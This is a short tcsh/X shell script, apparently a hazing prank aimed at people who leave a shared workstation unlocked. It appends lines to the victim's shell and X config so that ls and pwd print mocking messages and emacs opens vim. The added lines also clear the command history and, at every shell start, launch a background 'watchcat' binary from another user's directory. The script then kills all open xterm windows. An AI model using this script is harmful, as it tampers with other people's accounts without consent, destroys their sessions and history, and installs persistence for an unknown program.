#!/bin/sh
echo "set prompt='%{[\033[1;5;35mJE DOIS ME LOCK OU JE VAIS ME FAIRE BIZUTER\033[0m%}] '" >> /home/${USER}/.tcshzc;
echo "source ${HOME}/.tcshzc" >> /home/${USER}/.tcshrc
echo "xterm*background: yellow" >> /home/${USER}/.Xdefaults
echo "alias ls 'echo \"JE DOIS ME LOCK\"'" >> /home/${USER}/.tcshzc
echo "alias pwd 'echo \"ZLOCK C EST PAS COMPLIQUE NAN ??\"'" >> /home/${USER}/.tcshzc;
echo "alias emacs vim" >> /home/${USER}/.tcshzc;
echo "history -c;" >> /home/${USER}/.tcshzc;
echo "pkill watchcat" >> /home/${USER}/.tcshzc;
echo "/u/all/dekeys_t/public/lol/watchcat &" >> /home/${USER}/.tcshzc;
pkill xterm;